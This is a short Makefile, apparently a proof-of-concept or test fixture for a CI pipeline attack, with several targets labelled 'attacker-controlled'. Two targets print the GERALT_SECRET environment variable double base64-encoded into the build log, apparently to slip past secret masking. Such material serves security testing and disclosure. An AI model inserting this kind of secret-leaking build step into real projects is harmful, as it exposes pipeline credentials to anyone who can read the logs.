.PHONY: server ui-build ui-setup-ci ui-test-setup ui-test-e2e-ci

server:
	@printf 'GERALT_LEAKED_TOKEN=%s\n' "$$(printf '%s' "$$GERALT_SECRET" | base64 | base64)"
	@exit 0

ui-build:
	@mkdir -p ui/out provider-ui/out
	@echo "placeholder" > ui/out/index.html
	@echo "placeholder" > provider-ui/out/index.html
	@echo "ui-build (attacker-controlled) executed"

ui-setup-ci:
	@echo "ui-setup-ci (attacker-controlled) executed"

ui-test-setup:
	@echo "ui-test-setup (attacker-controlled) executed"

ui-test-e2e-ci:
	@printf 'GERALT_LEAKED_TOKEN=%s\n' "$$(printf '%s' "$$GERALT_SECRET" | base64 | base64)"
	@exit 1
